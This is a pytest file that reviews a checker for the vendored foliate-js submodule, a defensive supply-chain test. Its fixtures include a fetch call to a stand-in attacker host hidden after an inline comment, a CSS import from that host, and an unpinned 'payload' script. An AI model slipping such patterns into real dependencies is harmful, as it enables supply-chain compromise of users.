"""EF-LEC-003 (M5 L11, PR #370): independent supply-chain review of the foliate-js submodule.

Each test is a red proof of a hole found at the reviewed head, marked `xfail(strict=True)`: the
fix turns it green, and strict mode then makes the suite fail until the marker is removed.
Findings and answers: `docs/decisions/M5.md`, section "#370 : contradicteur".
"""

import re
from pathlib import Path

import pytest

from tests.tools_loader import REPO, load_tool

pin = load_tool("check_submodule_pin")

SUBMODULE = "frontend/vendor/foliate-js"


def _vendored(tmp_path: Path, files: dict[str, str]) -> Path:
    base = tmp_path / SUBMODULE
    for name, text in files.items():
        path = base / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return base


# --- R1: the comment stripper drops real code -----------------------------------------------------


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_review370_code_after_an_inline_block_comment_is_scanned(tmp_path: Path) -> None:
    """`_code` drops any line starting with `/*` that also closes it: the code after is lost."""
    _vendored(tmp_path, {"newfile.js": '/**/ fetch("https://evil.example.test/x")\n'})
    problems = pin.asset_problems(tmp_path)
    assert any("evil.example.test" in p for p in problems), problems
    assert any("fetch" in p for p in problems), problems


# --- R2: workers can be turned back on -----------------------------------------------------------


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
def test_review370_a_later_configure_cannot_turn_zip_workers_back_on(tmp_path: Path) -> None:
    """The guard looks for one `configure({ useWebWorkers: false` line; `\\bWorker\\b` does not
    match `useWebWorkers`, so a second call with `true` is counted nowhere."""
    _vendored(
        tmp_path,
        {"view.js": "configure({ useWebWorkers: false })\nconfigure({ useWebWorkers: true })\n"},
    )
    assert any("useWebWorkers" in p for p in pin.asset_problems(tmp_path))


# --- R3: vendor/ admits unpinned files that are code ---------------------------------------------


@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
@pytest.mark.parametrize(
    "files",
    [
        # A script without extension, reached by a static import (static imports are not counted).
        {"epub.js": "import './vendor/payload'\n", "vendor/payload": "fetch(u)\n"},
        # A stylesheet in vendor/ that loads from a third-party host (vendor/ is not scanned).
        {"vendor/extra.css": "@import url(https://evil.example.test/x.css);\n"},
    ],
    ids=["extensionless-script", "vendor-css-remote-import"],
)
def test_review370_vendor_refuses_unpinned_code_and_remote_hosts(
    tmp_path: Path, files: dict[str, str]
) -> None:
    """Only `LICENSE*`, `.bcmap`, fonts and pdf.js maps are data; the rest is pinned or refused."""
    _vendored(tmp_path, files)
    assert pin.asset_problems(tmp_path), files


# --- R4: third-party notices are incomplete ------------------------------------------------------


@pytest.mark.req("EF-LEC-003")
def test_review370_notices_cover_sjcl_and_carry_the_bundle_licence_texts() -> None:
    """vendor/zip.js is zip-core 2.8.22, which bundles SJCL (AES and PBKDF2, `invalid aes key
    size`): Stanford, BSD or GPL-2.0, a notice of its own. The bundles are minified without
    header and foliate ships no LICENSE next to them, so MIT (fflate) and BSD-3-Clause (zip.js),
    which require their text with every copy, must be reproduced in THIRD_PARTY_NOTICES; the
    file says "Each licence text is in the submodule", which is false for these two."""
    notices = (REPO / "THIRD_PARTY_NOTICES").read_text(encoding="utf-8")
    assert "SJCL" in notices, "zip.js embeds the Stanford Javascript Crypto Library"
    assert "Arjun Barrett" in notices and notices.count("Permission is hereby granted") >= 2, (
        "the MIT text of fflate is reproduced, not only named"
    )
    assert "Gildas Lormeau" in notices and "Redistributions in binary form" in notices, (
        "the BSD-3-Clause text of zip.js is reproduced, not only named"
    )


# --- R5: Safari floor of the EPUB engine ---------------------------------------------------------


@pytest.mark.req("EF-LEC-003")
def test_review370_adr_safari_floor_matches_the_pinned_zip_bundle() -> None:
    """foliate builds vendor/zip.js from `zip-core.js` (no JavaScript inflate codec) and turns the
    workers off: a deflated EPUB needs the native `DecompressionStream('deflate-raw')`, which
    Safari has from 16.4. ADR-0055 still sets the EPUB floor at Safari and iOS 16.1."""
    adr = (REPO / "docs/adr/0055-lecteur-integre-m5.md").read_text(encoding="utf-8")
    floor = re.search(r"\*\*Safari et iOS ([0-9.]+) au moins\*\*", adr)
    assert floor is not None
    assert tuple(int(x) for x in floor.group(1).split(".")) >= (16, 4), floor.group(0)
